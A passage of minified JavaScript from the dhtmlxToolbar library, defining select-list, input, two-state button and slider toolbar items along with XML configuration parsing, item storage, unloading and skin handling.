this};this._buttonButtonSelectObject=function(r,o,q){var n=true;if(typeof(o.enabled)!=""undefined""){n=window.dhx4.s2b(o.enabled)}else{if(typeof(o.disabled)!=""undefined""){n=window.dhx4.s2b(o.disabled)}}this.obj={};this.obj.tr=document.createElement(""TR"");this.obj.tr.en=n;this.obj.tr.extAction=(o.action||null);this.obj.tr._selected=(o.selected!=null);this.obj.tr.className=""tr_btn""+(this.obj.tr.en?(this.obj.tr._selected&&a.renderSelect?"" tr_btn_selected"":""""):"" tr_btn_disabled"");this.obj.tr.onselectstart=function(s){s=s||event;if(s.preventDefault){s.preventDefault()}else{s.returnValue=false}return false};this.obj.tr.idd=String(r);if(isNaN(q)){q=a.p_tbody.childNodes.length+1}else{if(q<1){q=1}}if(q>a.p_tbody.childNodes.length){a.p_tbody.appendChild(this.obj.tr)}else{a.p_tbody.insertBefore(this.obj.tr,a.p_tbody.childNodes[q-1])}this.obj.td_a=document.createElement(""TD"");this.obj.td_a.className=""td_btn_img"";this.obj.td_a.onselectstart=function(s){s=s||event;if(s.preventDefault){s.preventDefault()}else{s.returnValue=false}return false};this.obj.td_b=document.createElement(""TD"");this.obj.td_b.className=""td_btn_txt"";this.obj.td_b.onselectstart=function(s){s=s||event;if(s.preventDefault){s.preventDefault()}else{s.returnValue=false}return false};if(e.rtl){this.obj.tr.appendChild(this.obj.td_b);this.obj.tr.appendChild(this.obj.td_a)}else{this.obj.tr.appendChild(this.obj.td_a);this.obj.tr.appendChild(this.obj.td_b)}if(o.img!=null){this.obj.td_a.innerHTML=""<img class='btn_sel_img' src='""+e.conf.icons_path+o.img+""' border='0'>"";this.obj.tr._img=o.img}else{this.obj.td_a.innerHTML=""&nbsp;""}var m=(o.text!=null?o.text:(o.itemText||""""));this.obj.td_b.innerHTML=""<div class='btn_sel_text'>""+m+""</div>"";this.obj.tr[window.dhx4.isIPad?""ontouchstart"":""onmouseover""]=function(){if(!this.en||(this._selected&&a.renderSelect)){return}this.className=""tr_btn tr_btn_over""};this.obj.tr.onmouseout=function(){if(!this.en){return}if(this._selected&&a.renderSelect){if(String(this.className).search(""tr_btn_selected"")==-1){this.className=""tr_btn tr_btn_selected""}}else{this.className=""tr_btn""}};this.obj.tr[window.dhx4.isIPad?""ontouchend"":""onclick""]=function(s){s=s||event;s.cancelBubble=true;if(!this.en){return}a.setListOptionSelected(this.idd.replace(e.idPrefix,""""));a.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_def"";a.obj.className=a.obj.renderAs;a.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"");window.dhx4.zim.clear(a.polygon._idd);a.polygon.style.display=""none"";if(a.polygon._ie6cover){a.polygon._ie6cover.style.display=""none""}if(e.conf.skin==""dhx_terrace""){e._improveTerraceButtonSelect(a.id,true)}e.anyUsed=""none"";var u=this.idd.replace(e.idPrefix,"""");if(this.extAction){try{window[this.extAction](u)}catch(s){}}e.callEvent(""onClick"",[u])};a._listOptions[r]=this.obj;return this};this.polygon=document.createElement(""DIV"");this.polygon.dir=""ltr"";this.polygon.style.display=""none"";this.polygon.className=""dhx_toolbar_poly_""+e.conf.skin+"" dhxtoolbar_icons_""+e.conf.iconSize;this.polygon.onselectstart=function(m){m=m||event;if(m.preventDefault){m.preventDefault()}else{m.returnValue=false}};this.polygon.onmousedown=function(m){m=m||event;m.cancelBubble=true};this.polygon.style.overflowY=""auto"";this.polygon._idd=window.dhx4.newId();if(window.dhx4.isIPad){this.polygon.ontouchstart=function(m){m=m||event;if(m.preventDefault){m.preventDefault()}else{m.returnValue=false}m.cancelBubble=true;return false}}this.p_tbl=document.createElement(""TABLE"");this.p_tbl.className=""buttons_cont"";this.p_tbl.cellSpacing=""0"";this.p_tbl.cellPadding=""0"";this.p_tbl.border=""0"";this.polygon.appendChild(this.p_tbl);this.p_tbody=document.createElement(""TBODY"");this.p_tbl.appendChild(this.p_tbody);if(h.options!=null){for(var g=0;g<h.options.length;g++){var c=""_""+(h.options[g].type||"""")+""ButtonSelectObject"";if(h.options[g].id==null){h.options[g].id=e._genStr(24)}if(typeof(this[c])==""function""){new this[c](h.options[g].id,h.options[g])}}}document.body.appendChild(this.polygon);if(window.dhx4.isIE6){this.polygon._ie6cover=document.createElement(""IFRAME"");this.polygon._ie6cover.frameBorder=0;this.polygon._ie6cover.style.position=""absolute"";this.polygon._ie6cover.style.border=""none"";this.polygon._ie6cover.style.backgroundColor=""#000000"";this.polygon._ie6cover.style.filter=""alpha(opacity=100)"";this.polygon._ie6cover.style.display=""none"";this.polygon._ie6cover.setAttribute(""src"",""javascript:false;"");document.body.appendChild(this.polygon._ie6cover)}this.setWidth=function(m){this.obj.style.width=m-this.arw.offsetWidth+""px"";this.polygon.style.width=this.obj.offsetWidth+this.arw.offsetWidth-2+""px"";this.p_tbl.style.width=this.polygon.style.width};this.enableItem=function(){e._enableItem(this)};this.disableItem=function(){e._disableItem(this)};this.isEnabled=function(){return this.state};this.showItem=function(){this.obj.style.display="""";this.arw.style.display=""""};this.hideItem=function(){this.obj.style.display=""none"";this.arw.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};this.setItemText=function(m){e._setItemText(this,m)};this.getItemText=function(){return e._getItemText(this)};this.setItemImage=function(m){e._setItemImage(this,m,true)};this.clearItemImage=function(){e._clearItemImage(this,true)};this.setItemImageDis=function(m){e._setItemImage(this,m,false)};this.clearItemImageDis=function(){e._clearItemImage(this,false)};this.setItemToolTip=function(m){this.obj.title=m;this.arw.title=m};this.getItemToolTip=function(){return this.obj.title};this.addListOption=function(s,r,o,q,m){if(!(o==""button""||o==""separator"")){return}var n={id:s,type:o,text:q,img:m};new this[""_""+o+""ButtonSelectObject""](s,n,r)};this.removeListOption=function(o){if(!this._isListButton(o,true)){return}var m=this._listOptions[o];if(m.td_a!=null&&m.td_b!=null){m.td_a.onselectstart=null;m.td_b.onselectstart=null;while(m.td_a.childNodes.length>0){m.td_a.removeChild(m.td_a.childNodes[0])}while(m.td_b.childNodes.length>0){m.td_b.removeChild(m.td_b.childNodes[0])}m.tr.onselectstart=null;m.tr.onmouseover=null;m.tr.onmouseout=null;m.tr.onclick=null;while(m.tr.childNodes.length>0){m.tr.removeChild(m.tr.childNodes[0])}m.tr.parentNode.removeChild(m.tr);m.td_a=null;m.td_b=null;m.tr=null}else{m.sep.onselectstart=null;m.td.onselectstart=null;m.tr.onselectstart=null;while(m.td.childNodes.length>0){m.td.removeChild(m.td.childNodes[0])}while(m.tr.childNodes.length>0){m.tr.removeChild(m.tr.childNodes[0])}m.tr.parentNode.removeChild(m.tr);m.sep=null;m.td=null;m.tr=null}m=null;this._listOptions[o]=null;try{delete this._listOptions[o]}catch(n){}};this.showListOption=function(m){if(!this._isListButton(m,true)){return}this._listOptions[m].tr.style.display=""""};this.hideListOption=function(m){if(!this._isListButton(m,true)){return}this._listOptions[m].tr.style.display=""none""};this.isListOptionVisible=function(m){if(!this._isListButton(m,true)){return}return(this._listOptions[m].tr.style.display!=""none"")};this.enableListOption=function(m){if(!this._isListButton(m)){return}this._listOptions[m].tr.en=true;this._listOptions[m].tr.className=""tr_btn""+(this._listOptions[m].tr._selected&&e.renderSelect?"" tr_btn_selected"":"""")};this.disableListOption=function(m){if(!this._isListButton(m)){return}this._listOptions[m].tr.en=false;this._listOptions[m].tr.className=""tr_btn tr_btn_disabled""};this.isListOptionEnabled=function(m){if(!this._isListButton(m)){return}return this._listOptions[m].tr.en};this.setListOptionPosition=function(o,n){if(!this._listOptions[o]||this.getListOptionPosition(o)==n||isNaN(n)){return}if(n<1){n=1}var m=this._listOptions[o].tr;this.p_tbody.removeChild(m);if(n>this.p_tbody.childNodes.length){this.p_tbody.appendChild(m)}else{this.p_tbody.insertBefore(m,this.p_tbody.childNodes[n-1])}m=null};this.getListOptionPosition=function(o){var n=-1;if(!this._listOptions[o]){return n}for(var m=0;m<this.p_tbody.childNodes.length;m++){if(this.p_tbody.childNodes[m]==this._listOptions[o].tr){n=m+1}}return n};this.setListOptionImage=function(o,m){if(!this._isListButton(o)){return}var n=this._listOptions[o].tr.childNodes[(e.rtl?1:0)];n.innerHTML=""<img src='""+e.conf.icons_path+m+""' class='btn_sel_img'>"";n=null};this.getListOptionImage=function(o){if(!this._isListButton(o)){return}var n=this._listOptions[o].tr.childNodes[(e.rtl?1:0)];var m=null;if(n.childNodes.length>0){m=n.childNodes[0].src}n=null;return m};this.clearListOptionImage=function(n){if(!this._isListButton(n)){return}var m=this._listOptions[n].tr.childNodes[(e.rtl?1:0)];while(m.childNodes.length>0){m.removeChild(m.childNodes[0])}m.innerHTML=""&nbsp;"";m=null};this.setListOptionText=function(n,m){if(!this._isListButton(n)){return}this._listOptions[n].tr.childNodes[(e.rtl?0:1)].childNodes[0].innerHTML=m};this.getListOptionText=function(m){if(!this._isListButton(m)){return}return this._listOptions[m].tr.childNodes[(e.rtl?0:1)].childNodes[0].innerHTML};this.setListOptionToolTip=function(n,m){if(!this._isListButton(n)){return}this._listOptions[n].tr.title=m};this.getListOptionToolTip=function(m){if(!this._isListButton(m)){return}return this._listOptions[m].tr.title};this.forEachListOption=function(n){for(var m in this._listOptions){n(m)}};this.getAllListOptions=function(){var n=new Array();for(var m in this._listOptions){n[n.length]=m}return n};this.setListOptionSelected=function(o){for(var m in this._listOptions){var n=this._listOptions[m];if(n.td_a!=null&&n.td_b!=null&&n.tr.en){if(m==o){n.tr._selected=true;n.tr.className=""tr_btn""+(this.renderSelect?"" tr_btn_selected"":"""");if(this.mode==""select""){if(n.tr._img){this.setItemImage(n.tr._img)}else{this.clearItemImage()}this.setItemText(this.getListOptionText(o))}}else{n.tr._selected=false;n.tr.className=""tr_btn""}}n=null}};this.getListOptionSelected=function(){var n=null;for(var m in this._listOptions){if(this._listOptions[m].tr._selected==true){n=m}}return n};this._isListButton=function(n,m){if(this._listOptions[n]==null){return false}if(!m&&this._listOptions[n].tr.className==""tr_sep""){return false}return true};this.setMaxOpen=function(m){this._ph=null;if(typeof(m)==""number""){this.maxOpen=m;this._maxOpenTest();return}this.maxOpen=null};if(h.width){this.setWidth(h.width)}if(this.mode==""select""&&typeof(h.selected)!=""undefined""){this.setListOptionSelected(h.selected)}return this};dhtmlXToolbarObject.prototype._buttonInputObject=function(e,h,g){this.id=e.idPrefix+h;this.obj=document.createElement(""DIV"");this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_def"";this.obj.style.display=(g.hidden!=null?""none"":"""");this.obj.idd=String(h);this.obj.w=(g.width!=null?g.width:100);this.obj.title=(g.title!=null?g.title:"""");this.obj.innerHTML=""<input class='dhxtoolbar_input' type='text' style='width:""+this.obj.w+""px;'""+(g.value!=null?"" value='""+g.value+""'"":"""")+"">"";var c=e;var a=this;this.obj.childNodes[0].onkeydown=function(l){l=l||event;if(l.keyCode==13){c.callEvent(""onEnter"",[a.obj.idd,this.value])}};e.base.appendChild(this.obj);this.enableItem=function(){this.obj.childNodes[0].disabled=false};this.disableItem=function(){this.obj.childNodes[0].disabled=true};this.isEnabled=function(){return(!this.obj.childNodes[0].disabled)};this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display!=""none"")};this.setValue=function(l){this.obj.childNodes[0].value=l};this.getValue=function(){return this.obj.childNodes[0].value};this.setWidth=function(l){this.obj.w=l;this.obj.childNodes[0].style.width=this.obj.w+""px""};this.getWidth=function(){return this.obj.w};this.setItemToolTip=function(l){this.obj.title=l};this.getItemToolTip=function(){return this.obj.title};this.getInput=function(){return this.obj.firstChild};if(typeof(g.enabled)!=""undefined""&&window.dhx4.s2b(g.enabled)==false){this.disableItem()}return this};dhtmlXToolbarObject.prototype._buttonTwoStateObject=function(a,g,c){this.id=a.idPrefix+g;this.state=(c.enabled!=null?false:true);this.imgEn=(c.img!=null?c.img:"""");this.imgDis=(c.imgdis!=null?c.imgdis:"""");this.img=(this.state?(this.imgEn!=""""?this.imgEn:""""):(this.imgDis!=""""?this.imgDis:""""));this.obj=document.createElement(""DIV"");this.obj.pressed=(c.selected!=null);this.obj.extAction=(c.action||null);this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.obj.pressed?""pres""+(this.state?"""":""_dis""):(this.state?""def"":""dis""));this.obj.style.display=(c.hidden!=null?""none"":"""");this.obj.renderAs=this.obj.className;this.obj.idd=String(g);this.obj.title=(c.title||"""");if(this.obj.pressed){this.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_over""}this.obj.innerHTML=a._rtlParseBtn((this.img!=""""?""<img src='""+a.conf.icons_path+this.img+""'>"":""""),(c.text!=null?""<div class='dhxtoolbar_text'>""+c.text+""</div>"":""""));a.base.appendChild(this.obj);var e=this;this.obj.onselectstart=function(h){h=h||event;if(h.preventDefault){h.preventDefault()}else{h.returnValue=false}};this.obj.onmouseover=function(){this._doOnMouseOver()};this.obj.onmouseout=function(){this._doOnMouseOut()};this.obj._doOnMouseOver=function(){if(e.state==false){return}if(a.anyUsed!=""none""){return}if(this.pressed){this.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_over"";return}this.className=""dhx_toolbar_btn dhxtoolbar_btn_over"";this.renderAs=this.className};this.obj._doOnMouseOut=function(){if(e.state==false){return}if(a.anyUsed!=""none""){return}if(this.pressed){this.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_def"";return}this.className=""dhx_toolbar_btn dhxtoolbar_btn_def"";this.renderAs=this.className};this.obj[window.dhx4.isIPad?""ontouchstart"":""onmousedown""]=function(h){if(a.checkEvent(""onBeforeStateChange"")){if(!a.callEvent(""onBeforeStateChange"",[this.idd.replace(a.idPrefix,""""),this.pressed])){return}}if(e.state==false){return}if(a.anyUsed!=""none""){return}this.pressed=!this.pressed;this.className=(this.pressed?""dhx_toolbar_btn dhxtoolbar_btn_pres"":this.renderAs);var l=this.idd.replace(a.idPrefix,"""");if(this.extAction){try{window[this.extAction](l,this.pressed)}catch(h){}}a.callEvent(""onStateChange"",[l,this.pressed]);return false};this.setItemState=function(h,m){if(this.obj.pressed!=h){if(h==true){this.obj.pressed=true;this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_pres""+(this.state?"""":""_dis"");this.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_over""}else{this.obj.pressed=false;this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.state?""def"":""dis"");this.obj.renderAs=this.obj.className}if(m==true){var n=this.obj.idd.replace(a.idPrefix,"""");if(this.obj.extAction){try{window[this.obj.extAction](n,this.obj.pressed)}catch(l){}}a.callEvent(""onStateChange"",[n,this.obj.pressed])}}};this.getItemState=function(){return this.obj.pressed};this.enableItem=function(){a._enableItem(this)};this.disableItem=function(){a._disableItem(this)};this.isEnabled=function(){return this.state};this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};this.setItemText=function(h){a._setItemText(this,h)};this.getItemText=function(){return a._getItemText(this)};this.setItemImage=function(h){a._setItemImage(this,h,true)};this.clearItemImage=function(){a._clearItemImage(this,true)};this.setItemImageDis=function(h){a._setItemImage(this,h,false)};this.clearItemImageDis=function(){a._clearItemImage(this,false)};this.setItemToolTip=function(h){this.obj.title=h};this.getItemToolTip=function(){return this.obj.title};return this};dhtmlXToolbarObject.prototype._sliderObject=function(g,l,h){this.id=g.idPrefix+l;this.state=(h.enabled!=null?(h.enabled==""true""?true:false):true);this.obj=document.createElement(""DIV"");this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.state?""def"":""dis"");this.obj.style.display=(h.hidden!=null?""none"":"""");this.obj.onselectstart=function(m){m=m||event;if(m.preventDefault){m.preventDefault()}else{m.returnValue=false}};this.obj.idd=String(l);this.obj.len=(h.length!=null?Number(h.length):50);this.obj.innerHTML=""<div class='dhxtoolbar_text'>""+(h.textMin||"""")+""</div><div class='dhxtoolbar_sl_bg_l'></div><div class='dhxtoolbar_sl_bg_m' style='width:""+this.obj.len+""px;'></div><div class='dhxtoolbar_sl_bg_r'></div><div class='dhxtoolbar_text'>""+(h.textMax||"""")+""</div>"";g.base.appendChild(this.obj);var a=this;this.pen=document.createElement(""DIV"");this.pen.className=""dhxtoolbar_sl_pen"";this.obj.appendChild(this.pen);var e=this.pen;this.label=document.createElement(""DIV"");this.label.dir=""ltr"";this.label.className=""dhx_toolbar_slider_label_""+g.conf.skin+(g.rtl?""_rtl"":"""");this.label.style.display=""none"";this.label.tip=(h.toolTip||""%v"");this.label._zi=window.dhx4.newId();document.body.appendChild(this.label);var c=this.label;this.pen.valueMin=(h.valueMin!=null?Number(h.valueMin):0);this.pen.valueMax=(h.valueMax!=null?Number(h.valueMax):100);if(this.pen.valueMin>this.pen.valueMax){this.pen.valueMin=this.pen.valueMax}this.pen.valueNow=(h.valueNow!=null?Number(h.valueNow):this.pen.valueMax);if(this.pen.valueNow>this.pen.valueMax){this.pen.valueNow=this.pen.valueMax}if(this.pen.valueNow<this.pen.valueMin){this.pen.valueNow=this.pen.valueMin}this.pen._detectLimits=function(){this.minX=a.obj.childNodes[1].offsetLeft+2;this.maxX=a.obj.childNodes[3].offsetLeft-this.offsetWidth+1};this.pen._detectLimits();this.pen._definePos=function(){this.nowX=Math.round((this.valueNow-this.valueMin)*(this.maxX-this.minX)/(this.valueMax-this.valueMin)+this.minX);this.style.left=this.nowX+""px"";this.newNowX=this.nowX};this.pen._definePos();this.pen.initXY=0;this.pen.allowMove=false;this.pen[window.dhx4.isIPad?""ontouchstart"":""onmousedown""]=function(m){if(a.state==false){return}m=m||event;this.initXY=(window.dhx4.isIPad?m.touches[0].clientX:m.clientX);this.newValueNow=this.valueNow;this.allowMove=true;this.className=""dhxtoolbar_sl_pen dhxtoolbar_over"";if(c.tip!=""""){c.style.visibility=""hidden"";c.style.display="""";c.innerHTML=c.tip.replace(""%v"",this.valueNow);c.style.left=Math.round(window.dhx4.absLeft(this)+this.offsetWidth/2-c.offsetWidth/2)+""px"";c.style.top=window.dhx4.absTop(this)-c.offsetHeight-3+""px"";c.style.visibility="""";c.style.zIndex=window.dhx4.zim.reserve(c._zi)}};this.pen._doOnMouseMoveStart=function(n){n=n||event;if(!e.allowMove){return}var m=(window.dhx4.isIPad?n.touches[0].clientX:n.clientX);var o=m-e.initXY;if(m<window.dhx4.absLeft(e)+Math.round(e.offsetWidth/2)&&e.nowX==e.minX){return}if(m>window.dhx4.absLeft(e)+Math.round(e.offsetWidth/2)&&e.nowX==e.maxX){return}e.newNowX=e.nowX+o;if(e.newNowX<e.minX){e.newNowX=e.minX}if(e.newNowX>e.maxX){e.newNowX=e.maxX}e.nowX=e.newNowX;e.style.left=e.nowX+""px"";e.initXY=m;e.newValueNow=Math.round((e.valueMax-e.valueMin)*(e.newNowX-e.minX)/(e.maxX-e.minX)+e.valueMin);if(c.tip!=""""){c.innerHTML=c.tip.replace(/%v/gi,e.newValueNow);c.style.left=Math.round(window.dhx4.absLeft(e)+e.offsetWidth/2-c.offsetWidth/2)+""px"";c.style.top=window.dhx4.absTop(e)-c.offsetHeight-3+""px""}n.cancelBubble=true;if(n.preventDefault){n.preventDefault()}else{n.returnValue=false}return false};this.pen._doOnMouseMoveEnd=function(){if(!e.allowMove){return}e.className=""dhxtoolbar_sl_pen"";e.allowMove=false;e.nowX=e.newNowX;e.valueNow=e.newValueNow;if(c.tip!=""""){c.style.display=""none"";window.dhx4.zim.clear(c._zi)}g.callEvent(""onValueChange"",[a.obj.idd.replace(g.idPrefix,""""),e.valueNow])};if(window.dhx4.isIPad){document.addEventListener(""touchmove"",e._doOnMouseMoveStart,false);document.addEventListener(""touchend"",e._doOnMouseMoveEnd,false)}else{if(typeof(window.addEventListener)!=""undefined""){window.addEventListener(""mousemove"",e._doOnMouseMoveStart,false);window.addEventListener(""mouseup"",e._doOnMouseMoveEnd,false)}else{document.body.attachEvent(""onmousemove"",e._doOnMouseMoveStart);document.body.attachEvent(""onmouseup"",e._doOnMouseMoveEnd)}}this.enableItem=function(){if(this.state){return}this.state=true;this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_def""};this.disableItem=function(){if(!this.state){return}this.state=false;this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_dis""};this.isEnabled=function(){return this.state};this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};this.setValue=function(m,n){m=Number(m);if(m<this.pen.valueMin){m=this.pen.valueMin}if(m>this.pen.valueMax){m=this.pen.valueMax}this.pen.valueNow=m;this.pen._definePos();if(n==true){g.callEvent(""onValueChange"",[this.obj.idd.replace(g.idPrefix,""""),this.pen.valueNow])}};this.getValue=function(){return this.pen.valueNow};this.setMinValue=function(n,m){n=Number(n);if(n>this.pen.valueMax){return}this.obj.childNodes[0].innerHTML=m;this.obj.childNodes[0].style.display=(m.length>0?"""":""none"");this.pen.valueMin=n;if(this.pen.valueNow<this.pen.valueMin){this.pen.valueNow=this.pen.valueMin}this.pen._detectLimits();this.pen._definePos()};this.setMaxValue=function(n,m){n=Number(n);if(n<this.pen.valueMin){return}this.obj.childNodes[4].innerHTML=m;this.obj.childNodes[4].style.display=(m.length>0?"""":""none"");this.pen.valueMax=n;if(this.pen.valueNow>this.pen.valueMax){this.pen.valueNow=this.pen.valueMax}this.pen._detectLimits();this.pen._definePos()};this.getMinValue=function(){var m=this.obj.childNodes[0].innerHTML;var n=this.pen.valueMin;return new Array(n,m)};this.getMaxValue=function(){var m=this.obj.childNodes[4].innerHTML;var n=this.pen.valueMax;return new Array(n,m)};this.setItemToolTipTemplate=function(m){this.label.tip=m};this.getItemToolTipTemplate=function(){return this.label.tip};return this};dhtmlXToolbarObject.prototype.unload=function(){if(this.conf.isIPad){document.removeEventListener(""touchstart"",this._doOnClick,false)}else{if(typeof(window.addEventListener)==""function""){window.removeEventListener(""mousedown"",this._doOnClick,false)}else{document.body.detachEvent(""onmousedown"",this._doOnClick)}}this._doOnClick=null;this.clearAll();this.objPull=null;if(this._xmlLoader){this._xmlLoader.destructor();this._xmlLoader=null}while(this.base.childNodes.length>0){this.base.removeChild(this.base.childNodes[0])}this.cont.removeChild(this.base);this.base=null;while(this.cont.childNodes.length>0){this.cont.removeChild(this.cont.childNodes[0])}this.cont.className="""";this.cont=null;window.dhx4._enableDataLoading(this,null,null,null,""clear"");window.dhx4._eventable(this,""clear"");this.tX1=null;this.tX2=null;this.tY1=null;this.tY2=null;this.anyUsed=null;this.idPrefix=null;this.rootTypes=null;this._rtl=null;this._rtlParseBtn=null;this.setRTL=null;this._sbw=null;this._getObj=null;this._addImgObj=null;this._setItemImage=null;this._clearItemImage=null;this._setItemText=null;this._getItemText=null;this._enableItem=null;this._disableItem=null;this._xmlParser=null;this._addItemToStorage=null;this._genStr=null;this._addItem=null;this._getPosition=null;this._setPosition=null;this._getIdByPosition=null;this._separatorObject=null;this._textObject=null;this._buttonObject=null;this._buttonSelectObject=null;this._buttonInputObject=null;this._buttonTwoStateObject=null;this._sliderObject=null;this._autoDetectVisibleArea=null;this._removeItem=null;this.setAlign=null;this.setSkin=null;this.setIconsPath=null;this.setIconPath=null;this.loadXML=null;this.loadXMLString=null;this.clearAll=null;this.addSpacer=null;this.removeSpacer=null;this.getType=null;this.getTypeExt=null;this.inArray=null;this.getParentId=null;this.addButton=null;this.addText=null;this.addButtonSelect=null;this.addButtonTwoState=null;this.addSeparator=null;this.addSlider=null;this.addInput=null;this.forEachItem=null;this.showItem=null;this.hideItem=null;this.isVisible=null;this.enableItem=null;this.disableItem=null;this.isEnabled=null;this.setItemText=null;this.getItemText=null;this.setItemToolTip=null;this.getItemToolTip=null;this.setItemImage=null;this.setItemImageDis=null;this.clearItemImage=null;this.clearItemImageDis=null;this.setItemState=null;this.getItemState=null;this.setItemToolTipTemplate=null;this.getItemToolTipTemplate=null;this.setValue=null;this.getValue=null;this.setMinValue=null;this.getMinValue=null;this.setMaxValue=null;this.getMaxValue=null;this.setWidth=null;this.getWidth=null;this.getPosition=null;this.setPosition=null;this.removeItem=null;this.addListOption=null;this.removeListOption=null;this.showListOption=null;this.hideListOption=null;this.isListOptionVisible=null;this.enableListOption=null;this.disableListOption=null;this.isListOptionEnabled=null;this.setListOptionPosition=null;this.getListOptionPosition=null;this.setListOptionText=null;this.getListOptionText=null;this.setListOptionToolTip=null;this.getListOptionToolTip=null;this.setListOptionImage=null;this.getListOptionImage=null;this.clearListOptionImage=null;this.forEachListOption=null;this.getAllListOptions=null;this.setListOptionSelected=null;this.getListOptionSelected=null;this.unload=null;this.setUserData=null;this.getUserData=null;this.setMaxOpen=null;this.items=null;this.conf=null};dhtmlXToolbarObject.prototype._autoDetectVisibleArea=function(){var a=window.dhx4.screenDim();this.tX1=a.left;this.tX2=a.right;this.tY1=a.top;this.tY2=a.bottom};dhtmlXToolbarObject.prototype._initObj=function(c){for(var a=0;a<c.length;a++){this._addItemToStorage(c[a])}if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype._xmlToJson=function(v){var o=[];var A=v.getElementsByTagName(""toolbar"");if(A!=null&&A[0]!=null){A=A[0];var x=function(e){var h=e.getElementsByTagName(""itemText"");if(h!=null&&h[0]!=null){return window.dhx4._xmlNodeValue(h[0])}return null};var E=[""id"",""type"",""hidden"",""title"",""text"",""enabled"",""img"",""imgdis"",""action"",""openAll"",""renderSelect"",""mode"",""maxOpen"",""width"",""value"",""selected"",""length"",""textMin"",""textMax"",""toolTip"",""valueMin"",""valueMax"",""valueNow""];var g=[""id"",""type"",""enabled"",""disabled"",""action"",""selected"",""img"",""text""];for(var c=0;c<A.childNodes.length;c++){if(A.childNodes[c].tagName==""item""){var n={};for(var C=0;C<E.length;C++){var l=A.childNodes[c].getAttribute(E[C]);if(l!=null){n[E[C]]=l}}for(var y=0;y<A.childNodes[c].childNodes.length;y++){if(A.childNodes[c].childNodes[y].tagName==""item""&&n.type==""buttonSelect""){var D={};for(var C=0;C<g.length;C++){var l=A.childNodes[c].childNodes[y].getAttribute(g[C]);if(l!=null){D[g[C]]=l}}var s=A.childNodes[c].childNodes[y].getElementsByTagName(""userdata"");for(var C=0;C<s.length;C++){if(!D.userdata){D.userdata={}}var a={};try{a.name=s[C].getAttribute(""name"")}catch(m){a.name=null}try{a.value=s[C].firstChild.nodeValue}catch(m){a.value=""""}if(a.name!=null){D.userdata[a.name]=a.value}}D.text=x(A.childNodes[c].childNodes[y])||D.text;if(n.options==null){n.options=[]}n.options.push(D)}if(A.childNodes[c].childNodes[y].tagName==""userdata""){if(n.userdata==null){n.userdata={}}var D={};try{D.name=A.childNodes[c].childNodes[y].getAttribute(""name"")}catch(m){D.name=null}try{D.value=A.childNodes[c].childNodes[y].firstChild.nodeValue}catch(m){D.value=""""}if(D.name!=null){n.userdata[D.name]=D.value}}}n.text=x(A.childNodes[c])||n.text;o.push(n)}}x=null}return o};dhtmlXToolbarObject.prototype._addItemToStorage=function(l,n){var m=(l.id||this._genStr(24));var g=(l.type||"""");if(g==""spacer""){this.addSpacer(this._lastId)}else{this._lastId=m}if(g!=""""&&this[""_""+g+""Object""]!=null){if(g==""buttonSelect""){if(l.options!=null){for(var h=0;h<l.options.length;h++){if(l.options[h].type==""obj""){l.options[h].type=""button""}if(l.options[h].type==""sep""){l.options[h].type=""separator""}}}}if(g==""slider""){var e={tip_template:""toolTip"",value_min:""valueMin"",value_max:""valueMax"",value_now:""valueNow"",text_min:""textMin"",text_max:""textMax""};for(var c in e){if(l[e[c]]==null&&l[c]!=null){l[e[c]]=l[c]}}}if(g==""buttonInput""){if(l.value==null&&l.text!=null){l.value=l.text}}if(g==""buttonTwoState""){if(typeof(l.selected)==""undefined""&&typeof(l.pressed)!=""undefined""&&window.dhx4.s2b(l.pressed)){l.selected=true}}if(typeof(l.enabled)==""undefined""&&typeof(l.disabled)!=""undefined""&&window.dhx4.s2b(l.disabled)){l.enabled=false}if(l.imgDis==null&&l.img_disabled!=null){l.imgdis=l.img_disabled}if((typeof(l.openAll)==""undefined""||l.openAll==null)&&this.conf.skin==""dhx_terrace""){l.openAll=true}this.objPull[this.idPrefix+m]=new this[""_""+g+""Object""](this,m,l);this.objPull[this.idPrefix+m][""type""]=g;this.setPosition(m,n)}if(l.userdata!=null){for(var c in l.userdata){this.setUserData(m,c,l.userdata[c])}}if(l.options!=null){for(var h=0;h<l.options.length;h++){if(l.options[h].userdata!=null){for(var c in l.options[h].userdata){this.setListOptionUserData(l.id,l.options[h].id,c,l.options[h].userdata[c])}}}}};dhtmlXToolbarObject.prototype.setSkin=function(h,e){if(e===true){this.cont.className=this.cont.className.replace(/dhxtoolbar_icons_\d{1,}/,""dhxtoolbar_icons_""+this.conf.iconSize)}else{this.conf.skin=h;if(this.conf.skin==""dhx_skyblue""){this.conf.sel_ofs_y=1}if(this.conf.skin==""dhx_web""){this.conf.sel_ofs_y=1;this.conf.sel_ofs_x=1}if(this.conf.skin==""dhx_terrace""){this.conf.sel_ofs_y=-1;this.conf.sel_ofs_x=0}this.cont.className=""dhx_toolbar_""+this.conf.skin+"" dhxtoolbar_icons_""+this.conf.iconSize}for(var c in this.objPull){var g=this.objPull[c];if(g.type==""slider""){g.pen._detectLimits();g.pen._definePos();g.label.className=""dhx_toolbar_slider_label_""+this.conf.skin}if(g.type==""buttonSelect""){g.polygon.className=""dhx_toolbar_poly_""+this.conf.skin+"" 